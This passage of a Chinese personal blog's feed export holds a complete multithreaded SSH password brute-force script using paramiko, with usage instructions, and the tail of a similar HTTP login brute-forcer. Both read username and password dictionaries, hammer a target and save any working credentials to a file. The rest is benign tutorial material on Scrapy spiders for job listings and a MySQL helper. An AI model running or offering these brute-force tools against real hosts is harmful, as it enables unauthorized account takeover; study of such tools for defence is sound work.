            <span class="hljs-string">&#x27;password&#x27;</span>:password,
            <span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;%E7%99%BB%E5%BD%95&#x27;</span>
        &#125;
        print(<span class="hljs-string">&quot;username:&#123;&#125;,password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username,password))
        response = requests.post(self.url, data=data, headers=self.headers)

        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Login failed&#x27;</span> <span class="hljs-keyword">in</span> response.text:
            <span class="hljs-keyword">pass</span>
        <span class="hljs-keyword">else</span>:
            print(<span class="hljs-string">&quot;success!!! username:&#123;&#125;, password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
            resultFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)
            resultFile.write(<span class="hljs-string">&quot;success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
            resultFile.close()
            <span class="hljs-comment"># 程序终止，0表示正常退出</span>
            <span class="hljs-comment"># os._exit(0) </span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-keyword">for</span> userItem <span class="hljs-keyword">in</span> self.username:
            <span class="hljs-keyword">for</span> pwdItem <span class="hljs-keyword">in</span> self.password:
                self.run(userItem, pwdItem)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">BruteForceHttp</span>():</span>

    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)]
    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;passwords&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)]

    <span class="hljs-comment"># 对密码和用户名进行分块处理</span>
    blockUsername = partition(listUsername, BLOCK_SIZE)
    blockPassword = partition(listPassword, BLOCK_SIZE)

    threads = []
    <span class="hljs-comment"># 将不同的密码子块分给不同的线程爆破</span>
    <span class="hljs-keyword">for</span> sonUserBlock <span class="hljs-keyword">in</span> blockUsername:
        <span class="hljs-keyword">for</span> sonPwdBlock <span class="hljs-keyword">in</span> blockPassword:

            work = ThreadWork(sonUserBlock, sonPwdBlock)
            workThread = threading.Thread(target=work.start)

            threads.append(workThread)

    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.start()
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.join()

<span class="hljs-comment"># 将密码和账号分块函数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partition</span>(<span class="hljs-params">ls, size</span>):</span>
    res = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(ls), size):
        res.append(ls[i: i+size])
    <span class="hljs-keyword">return</span> res

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    time1 = time.time()
    BruteForceHttp()
    time2 = time.time()
    print(time2-time1)</code></pre>

<p>七十万条的数据跑了快十分钟，有点不可思议。。。可能是服务器的问题</p>
<h1 id="多线程破解SSH密码"><a href="#多线程破解SSH密码" class="headerlink" title="多线程破解SSH密码"></a>多线程破解SSH密码</h1><blockquote>
<p>passwords：密码字典 </p>
<p>username:   账号字典</p>
<p>result: 保存结果</p>
<p>SSHattack:连接日志</p>
<p>brute_SSH.py: 破解程序</p>
</blockquote>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-keyword">import</span> optparse
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> paramiko

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadWork</span>(<span class="hljs-params">threading.Thread</span>):</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, ip, usernameBlock, passwordBlock, port</span>):</span>
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.usernameBlock = usernameBlock
        self.passwordBlock = passwordBlock

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, username, password</span>):</span>
        <span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">        使用死循环</span>
<span class="hljs-string">        &#x27;&#x27;&#x27;</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">try</span>:
                paramiko.util.log_to_file(<span class="hljs-string">&quot;SSHattack.log&quot;</span>)
                ssh = paramiko.SSHClient()

                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                sys.stdout.write(<span class="hljs-string">&quot;[*]ssh[&#123;&#125;:&#123;&#125;:&#123;&#125; =&gt; &#123;&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(username,password,self.port, self.ip))
                ssh.connect(hostname=self.ip, port=self.port, username=username, password=password)
                ssh.close()
                print(<span class="hljs-string">&quot;[+]success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username , password))

                resultFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../brutpass/result&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>)

                resultFile.write(<span class="hljs-string">&quot;success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
                resultFile.close()

                os._exit(<span class="hljs-number">0</span>)
            <span class="hljs-keyword">except</span> paramiko.ssh_exception.AuthenticationException <span class="hljs-keyword">as</span> e:
                <span class="hljs-keyword">break</span>
            <span class="hljs-keyword">except</span> paramiko.ssh_exception.SSHException <span class="hljs-keyword">as</span> e:
                <span class="hljs-keyword">break</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-keyword">for</span> userItem <span class="hljs-keyword">in</span> self.usernameBlock:
            <span class="hljs-keyword">for</span> pwdItem <span class="hljs-keyword">in</span> self.passwordBlock:
                self.run(userItem, pwdItem)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partition</span>(<span class="hljs-params"><span class="hljs-built_in">list</span>, num</span>):</span>
    step = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>) / num)
    <span class="hljs-keyword">if</span> step == <span class="hljs-number">0</span>:
        step = num
    partition = [<span class="hljs-built_in">list</span>[i:i+step] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>), step)]
    <span class="hljs-keyword">return</span> partition

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SshEXP</span>(<span class="hljs-params">ip, usernameFile, passwordFile, threadNumber, sshPort</span>):</span>
    print(<span class="hljs-string">&quot;============爆破信息============&quot;</span>)
    print(<span class="hljs-string">&quot;IP:&quot;</span> + ip)
    print(<span class="hljs-string">&quot;UserName:&quot;</span> + usernameFile)
    print(<span class="hljs-string">&quot;PassWord:&quot;</span> + passwordFile)
    print(<span class="hljs-string">&quot;Threads:&quot;</span> + <span class="hljs-built_in">str</span>(threadNumber))
    print(<span class="hljs-string">&quot;Port:&quot;</span> + sshPort)
    print(<span class="hljs-string">&quot;=================================&quot;</span>)

    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../brutpass/username&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)]
    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../brutpass/passwords&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)]

    <span class="hljs-comment"># 读取账号文件和密码文件并存入对应列表</span>
    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(usernameFile)]
    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(passwordFile)]
    <span class="hljs-comment"># 账号列表和密码列表根据线程数量进行分块</span>
    blockUsername = partition(listUsername, threadNumber)
    blockPassword = partition(listPassword, threadNumber)
    threads = []
    <span class="hljs-comment"># 每个线程分配一个账号密码子块</span>
    <span class="hljs-keyword">for</span> sonUserBlock <span class="hljs-keyword">in</span> blockUsername:
        <span class="hljs-keyword">for</span> sonPwdBlock <span class="hljs-keyword">in</span> blockPassword:
            work = ThreadWork(ip, sonUserBlock, sonPwdBlock, sshPort)
            <span class="hljs-comment"># 创建线程</span>
            workThread = threading.Thread(target=work.start)
            <span class="hljs-comment"># 在threads中加入线程</span>
            threads.append(workThread)
    <span class="hljs-comment"># 开始子线程</span>
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.start()
    <span class="hljs-comment"># 阻塞主线程，等待所有子线程完成工作</span>
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.join()
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    parser = optparse.OptionParser(<span class="hljs-string">&#x27;usage: python %prog target [options] \n\n&#x27;</span>
                                   <span class="hljs-string">&#x27;Example: python %prog 127.0.0.1 -u ./username -p ./passwords -t 20\n&#x27;</span>)
    <span class="hljs-comment"># 添加目标主机参数-i</span>
    parser.add_option(<span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--ip&#x27;</span>, dest=<span class="hljs-string">&#x27;IP&#x27;</span>,
                      default=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target IP&#x27;</span>)
    <span class="hljs-comment"># 添加线程参数-t</span>
    parser.add_option(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--threads&#x27;</span>, dest=<span class="hljs-string">&#x27;threadNum&#x27;</span>,
                      default=<span class="hljs-number">10</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;int&#x27;</span>,
                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Number of threads [default = 10]&#x27;</span>)
    <span class="hljs-comment"># 添加用户名文件参数-u</span>
    parser.add_option(<span class="hljs-string">&#x27;-u&#x27;</span>, <span class="hljs-string">&#x27;--username&#x27;</span>, dest=<span class="hljs-string">&#x27;userName&#x27;</span>,
                      default=<span class="hljs-string">&#x27;./username&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;username file&#x27;</span>)
    <span class="hljs-comment"># 添加密码文件参数-p</span>
    parser.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--password&#x27;</span>, dest=<span class="hljs-string">&#x27;passWord&#x27;</span>,
                      default=<span class="hljs-string">&#x27;./password&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;password file&#x27;</span>)
    <span class="hljs-comment"># 添加SSH端口参数-P</span>
    parser.add_option(<span class="hljs-string">&#x27;-P&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, dest=<span class="hljs-string">&#x27;port&#x27;</span>,
                      default=<span class="hljs-string">&#x27;22&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;ssh port&#x27;</span>)
    (options, args) = parser.parse_args()

    SshEXP(options.IP, options.userName, options.passWord, options.threadNum, options.port)
</code></pre>

<p>使用方法</p>
<pre><code class="hljs stylus">python brute_SSH<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">164.166</span> -u ./username -<span class="hljs-selector-tag">p</span> ./passwords</code></pre>



<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210825163939574.png" alt="image-20210825163939574" style="zoom:80%;">

]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>reggie</title>
    <url>/2022/04/29/reggie/</url>
    <content><![CDATA[<h1 id="瑞吉外卖项目"><a href="#瑞吉外卖项目" class="headerlink" title="瑞吉外卖项目"></a>瑞吉外卖项目</h1><p>黑马程序员最新的springboot课程中的项目</p>
<p>项目地址为 <a href="https://github.com/sunzhengyu99/reggie">瑞吉</a></p>
<p>代码全是跟着视频敲出来的，后面会对项目进行优化。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>springboot</tag>
      </tags>
  </entry>
  <entry>
    <title>scrapy</title>
    <url>/2021/03/31/scrapy/</url>
    <content><![CDATA[<h1 id="学习分布式爬虫第一天"><a href="#学习分布式爬虫第一天" class="headerlink" title="学习分布式爬虫第一天"></a>学习分布式爬虫第一天</h1><h2 id="xpath编写"><a href="#xpath编写" class="headerlink" title="xpath编写"></a>xpath编写</h2><p>xpath学习，谷歌商店下载<code>xpath helper</code>，可以大大提高效率</p>
<p>jd也买你获取今日秒杀的商品信息</p>
<pre><code class="hljs css">//<span class="hljs-selector-tag">div</span><span class="hljs-selector-attr">[@class=<span class="hljs-string">&quot;slider_wrapper&quot;</span>]</span>/<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[position()&lt;5]</span><span class="hljs-selector-attr">[@title]</span></code></pre>



<pre><code class="hljs dns">三星Galaxy Note20 Ultra <span class="hljs-number">5</span>G(SM-N9860)S Pen&amp;三星笔记 <span class="hljs-number">120</span>Hz自适应屏幕 <span class="hljs-number">5</span>G手机 游戏手机 <span class="hljs-number">12</span>GB+<span class="hljs-number">512</span>GB 迷雾金¥<span class="hljs-number">9899</span>.<span class="hljs-number">00¥9999.00</span>
清风抽纸纸巾整箱<span class="hljs-number">24</span>包金装原木<span class="hljs-number">3</span>层<span class="hljs-number">130</span>抽婴儿适用卫生纸餐巾纸抽¥<span class="hljs-number">57.90¥169.00</span>
vivo Y3s <span class="hljs-number">5000m</span>Ah大电池长续航 <span class="hljs-number">128</span>GB大内存 AI智慧摄影 全网通新品手机 海风青 <span class="hljs-number">4</span>GB+<span class="hljs-number">64</span>GB¥<span class="hljs-number">999</span>.<span class="hljs-number">00¥1098.00</span></code></pre>



<h2 id="一些tip"><a href="#一些tip" class="headerlink" title="一些tip"></a>一些tip</h2><ul>
<li>关闭配置信息显示</li>
</ul>
<p>在setting.py添加<code>LOG_LEVEL = &quot;WARNING&quot;</code></p>
<ul>
<li>爬虫运行</li>
</ul>
<p>在pycharm中运行爬虫项目，需要在爬虫项目所在路径下建立一个py文件(与cfg文件同目录)</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> scrapy <span class="hljs-keyword">import</span> cmdline
cmdline.execute(<span class="hljs-string">&quot;scrapy crawl 爬虫名字&quot;</span>.split())</code></pre>

<ul>
<li>小知识</li>
</ul>
<p>将爬取到数据返回使用的时yield而不是return，返回给pipeline，pioeline中可以自定义方法</p>
<p>使用pipeline之前需要到seting.py中开启，就是将注释删除</p>
<h2 id="爬取腾讯招聘信息的scrapy爬虫"><a href="#爬取腾讯招聘信息的scrapy爬虫" class="headerlink" title="爬取腾讯招聘信息的scrapy爬虫"></a>爬取腾讯招聘信息的scrapy爬虫</h2><h3 id="1-首先创一个项目"><a href="#1-首先创一个项目" class="headerlink" title="1.首先创一个项目"></a>1.首先创一个项目</h3><p>创建项目的命令如下</p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">scrapy startproject tencent</span></code></pre>

<p>在进入项目创建一个爬虫</p>
<pre><code class="hljs awk">scrapy genspider hr careers.tencent.com
 <span class="hljs-regexp">//</span> hr 为爬虫的网站
 <span class="hljs-regexp">//</span> careers.tencent.com这个是爬虫允许爬取的地址</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210331215742791.png" alt="image-20210331215742791" style="zoom:67%;">



<h3 id="2-分析网页结构和url组成"><a href="#2-分析网页结构和url组成" class="headerlink" title="2.分析网页结构和url组成"></a>2.分析网页结构和url组成</h3><p>进入<code>https://careers.tencent.com/search.html</code>.</p>
<p>要爬取的内容为</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210331215908145.png" alt="image-20210331215908145"></p>
<p>查看源码可以发现并没有上面的字段，只有一些js代码，这就说明<code>https://careers.tencent.com/search.html</code>，并不是我们爬虫的start_url，所以第一步需要在该页面中找到我们的start_url</p>
<p>F12查看元素，并刷新网页，检查network中的XHR，很容易看到主页面显示的字段，说明我们的start_url，在这里，再查看headers获取到url</p>
<pre><code class="hljs sas">https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617199191983<span class="hljs-variable">&amp;countryId</span>=<span class="hljs-variable">&amp;cityId</span>=<span class="hljs-variable">&amp;bgIds</span>=<span class="hljs-variable">&amp;productId</span>=<span class="hljs-variable">&amp;categoryId</span>=<span class="hljs-variable">&amp;parentCategoryId</span>=<span class="hljs-variable">&amp;attrId</span>=<span class="hljs-variable">&amp;keyword</span>=<span class="hljs-variable">&amp;pageIndex</span>=1<span class="hljs-variable">&amp;pageSize</span>=10<span class="hljs-variable">&amp;language</span>=zh-cn<span class="hljs-variable">&amp;area</span>=cn</code></pre>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210331220441969.png" alt="image-20210331220441969"></p>
<p>接下来就是查看url的变化规则，让爬虫实现自动翻页，点击第二页再次查看上面的url</p>
<pre><code class="hljs sas">https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617199575064<span class="hljs-variable">&amp;countryId</span>=<span class="hljs-variable">&amp;cityId</span>=<span class="hljs-variable">&amp;bgIds</span>=<span class="hljs-variable">&amp;productId</span>=<span class="hljs-variable">&amp;categoryId</span>=<span class="hljs-variable">&amp;parentCategoryId</span>=<span class="hljs-variable">&amp;attrId</span>=<span class="hljs-variable">&amp;keyword</span>=<span class="hljs-variable">&amp;pageIndex</span>=2<span class="hljs-variable">&amp;pageSize</span>=10<span class="hljs-variable">&amp;language</span>=zh-cn<span class="hljs-variable">&amp;area</span>=cn</code></pre>

<p>很容易发现规律，就是pageIndex的值发生了变化</p>
<p>接下来就是工作的详情页的url</p>
<p>进入工作详情页，查看源码依然只有js，所以继续使用上面的方法查看url和内容</p>
<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>careers.tencent.com<span class="hljs-regexp">/tencentcareer/</span>api<span class="hljs-regexp">/post/</span>ByPostId?timestamp=<span class="hljs-number">1617199879005</span>&amp;postId=<span class="hljs-number">1377253503910551552</span>&amp;language=zh-cn</code></pre>

<p>其中改变的参数是<code>postId</code>，与priview中的值对应</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210331221442816.png" alt="image-20210331221442816"></p>
<h3 id="3-编写爬虫"><a href="#3-编写爬虫" class="headerlink" title="3.编写爬虫"></a>3.编写爬虫</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy
<span class="hljs-keyword">import</span> json

<span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617180957390&amp;countryId=&amp;cityId=&amp;bgIds=&amp;productId=&amp;categoryId=&amp;parentCategoryId=&amp;attrId=&amp;keyword=&amp;pageIndex=1&amp;pageSize=10&amp;language=zh-cn&amp;area=cn</span>
<span class="hljs-string"></span>
<span class="hljs-string">https://careers.tencent.com/tencentcareer/api/post/ByPostId?timestamp=1617181089850&amp;postId=1123175628615454720&amp;language=zh-cn</span>
<span class="hljs-string"></span>
<span class="hljs-string">https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617181122812&amp;countryId=&amp;cityId=&amp;bgIds=&amp;productId=&amp;categoryId=&amp;parentCategoryId=&amp;attrId=&amp;keyword=&amp;pageIndex=2&amp;pageSize=10&amp;language=zh-cn&amp;area=cn</span>
<span class="hljs-string">&#x27;&#x27;&#x27;</span>


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HrSpider</span>(<span class="hljs-params">scrapy.Spider</span>):</span>
    name = <span class="hljs-string">&#x27;hr&#x27;</span>
    allowed_domains = [<span class="hljs-string">&#x27;careers.tencent.com&#x27;</span>]
    <span class="hljs-comment"># start_urls = [&#x27;http://careers.tencent.com/&#x27;]</span>
    first_url = <span class="hljs-string">&quot;https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617180957390&amp;countryId=&amp;cityId=&amp;bgIds=&amp;productId=&amp;categoryId=&amp;parentCategoryId=&amp;attrId=&amp;keyword=&amp;pageIndex=&#123;&#125;&amp;pageSize=10&amp;language=zh-cn&amp;area=cn&quot;</span>
    <span class="hljs-comment"># firsturl的pageindex改变</span>
    <span class="hljs-comment"># 职位详情页的url</span>
    detial_url = <span class="hljs-string">&quot;https://careers.tencent.com/tencentcareer/api/post/ByPostId?timestamp=1617181089850&amp;postId=&#123;&#125;&amp;language=zh-cn&quot;</span>
    start_urls = [first_url.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)]

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span>(<span class="hljs-params">self, response</span>):</span>
        <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>):
            url = self.first_url.<span class="hljs-built_in">format</span>(page)
            <span class="hljs-comment"># 将url发送给parse_one继续处理</span>
            <span class="hljs-comment"># 这里也是分布式爬虫与普通爬虫的最大的地方</span>
            <span class="hljs-keyword">yield</span> scrapy.Request(
                url=url,
                callback=self.parse_one
            )

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_one</span>(<span class="hljs-params">self, response</span>):</span>
        <span class="hljs-comment"># 将网页的数据json格式化，方便获取数据</span>
        data = json.loads(response.text)
        <span class="hljs-comment"># print(data)</span>
        <span class="hljs-keyword">for</span> job <span class="hljs-keyword">in</span> data[<span class="hljs-string">&#x27;Data&#x27;</span>][<span class="hljs-string">&#x27;Posts&#x27;</span>]:
            item = &#123;&#125;
            <span class="hljs-comment"># 获取json格式中的数据</span>
            item[<span class="hljs-string">&#x27;job_name&#x27;</span>] = job[<span class="hljs-string">&#x27;RecruitPostName&#x27;</span>]
            item[<span class="hljs-string">&#x27;job_type&#x27;</span>] = job[<span class="hljs-string">&#x27;CategoryName&#x27;</span>]
            postid = job[<span class="hljs-string">&#x27;PostId&#x27;</span>]
            detial_url = self.detial_url.<span class="hljs-built_in">format</span>(postid)
            <span class="hljs-comment"># 将详情也的url交给另外一个parse_two处理</span>
          
            <span class="hljs-keyword">yield</span> scrapy.Request(
                url=detial_url,
                meta=&#123;<span class="hljs-string">&#x27;item&#x27;</span>: item&#125;, <span class="hljs-comment">#这里下面会有解释 &#x27;item&#x27;可以任意取名 item则是上面的item=&#123;&#125;</span>
                callback=self.parse_two
            )

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_two</span>(<span class="hljs-params">self, response</span>):</span>
        item = response.meta.get(<span class="hljs-string">&#x27;item&#x27;</span>) <span class="hljs-comment"># 这里是上面的&#x27;item&#x27;</span>
        data = json.loads(response.text)
        <span class="hljs-comment"># print(data)</span>
        item[<span class="hljs-string">&#x27;job_duty&#x27;</span>] = data[<span class="hljs-string">&#x27;Data&#x27;</span>][<span class="hljs-string">&#x27;Responsibility&#x27;</span>]
        item[<span class="hljs-string">&#x27;job_require&#x27;</span>] = data[<span class="hljs-string">&#x27;Data&#x27;</span>][<span class="hljs-string">&#x27;Requirement&#x27;</span>]
        <span class="hljs-keyword">yield</span> item
</code></pre>



<p>request类</p>
<pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Request</span>(<span class="hljs-params">object_ref</span>):</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, url, callback=<span class="hljs-literal">None</span>, method=<span class="hljs-string">&#x27;GET&#x27;</span>, headers=<span class="hljs-literal">None</span>, body=<span class="hljs-literal">None</span>,</span></span>
<span class="hljs-function"><span class="hljs-params">                 cookies=<span class="hljs-literal">None</span>, meta=<span class="hljs-literal">None</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, priority=<span class="hljs-number">0</span>,</span></span>
<span class="hljs-function"><span class="hljs-params">                 dont_filter=<span class="hljs-literal">False</span>, errback=<span class="hljs-literal">None</span>, flags=<span class="hljs-literal">None</span>, cb_kwargs=<span class="hljs-literal">None</span></span>):</span>
        self._encoding = encoding  <span class="hljs-comment"># this one has to be set first</span>
        self.method = <span class="hljs-built_in">str</span>(method).upper()
        self._set_url(url)
        self._set_body(body)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(priority, <span class="hljs-built_in">int</span>):
            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">f&quot;Request priority not an integer: <span class="hljs-subst">&#123;priority!r&#125;</span>&quot;</span>)
        self.priority = priority

        <span class="hljs-keyword">if</span> callback <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">callable</span>(callback):
            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">f&#x27;callback must be a callable, got <span class="hljs-subst">&#123;<span class="hljs-built_in">type</span>(callback).__name__&#125;</span>&#x27;</span>)
        <span class="hljs-keyword">if</span> errback <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">callable</span>(errback):
            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">f&#x27;errback must be a callable, got <span class="hljs-subst">&#123;<span class="hljs-built_in">type</span>(errback).__name__&#125;</span>&#x27;</span>)
        self.callback = callback
        self.errback = errback

        self.cookies = cookies <span class="hljs-keyword">or</span> &#123;&#125;
        self.headers = Headers(headers <span class="hljs-keyword">or</span> &#123;&#125;, encoding=encoding)
        self.dont_filter = dont_filter

        self._meta = <span class="hljs-built_in">dict</span>(meta) <span class="hljs-keyword">if</span> meta <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>
        self._cb_kwargs = <span class="hljs-built_in">dict</span>(cb_kwargs) <span class="hljs-keyword">if</span> cb_kwargs <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>
        self.flags = [] <span class="hljs-keyword">if</span> flags <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">list</span>(flags)
</code></pre>

<p>可以看到其中的参数很多，常用的是<code>url,cookie,meta</code></p>
<p>其中meta为字典类型</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>spider</tag>
      </tags>
  </entry>
  <entry>
    <title>spiderofwords</title>
    <url>/2021/05/02/spiderofwords/</url>
    <content><![CDATA[<p>scripy爬虫爬取单词(word.iciba.com)</p>
<h1 id="scripy爬虫爬取单词X"><a href="#scripy爬虫爬取单词X" class="headerlink" title="scripy爬虫爬取单词X"></a>scripy爬虫爬取单词X</h1><h1 id="首先创建一个有关数据库操作的py"><a href="#首先创建一个有关数据库操作的py" class="headerlink" title="首先创建一个有关数据库操作的py"></a>首先创建一个有关数据库操作的py</h1><p><code>dbhelper.py</code></p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql
<span class="hljs-keyword">from</span> scrapy.utils.project <span class="hljs-keyword">import</span> get_project_settings

// MYSQL_HOST等参数定义在setting.py中
// 也可以直接定义在这个文件中
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DBHelper</span>():</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>
        self.settings = get_project_settings()
        self.host = self.settings[<span class="hljs-string">&#x27;MYSQL_HOST&#x27;</span>]
        self.port = self.settings[<span class="hljs-string">&#x27;MYSQL_PORT&#x27;</span>]
        self.user = self.settings[<span class="hljs-string">&#x27;MYSQL_USER&#x27;</span>]
        self.passwd = self.settings[<span class="hljs-string">&#x27;MYSQL_PASSWD&#x27;</span>]
        self.db = self.settings[<span class="hljs-string">&#x27;MYSQL_DBNAME&#x27;</span>]

    // 建立数据库连接
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connectMysql</span>(<span class="hljs-params">self</span>):</span>
        conn = pymysql.connect(host=self.host,
                               port=self.port,
                               user=self.user,
                               passwd=self.passwd,
                               charset=<span class="hljs-string">&#x27;utf8&#x27;</span>)
        <span class="hljs-keyword">return</span> conn

	// 创建数据库
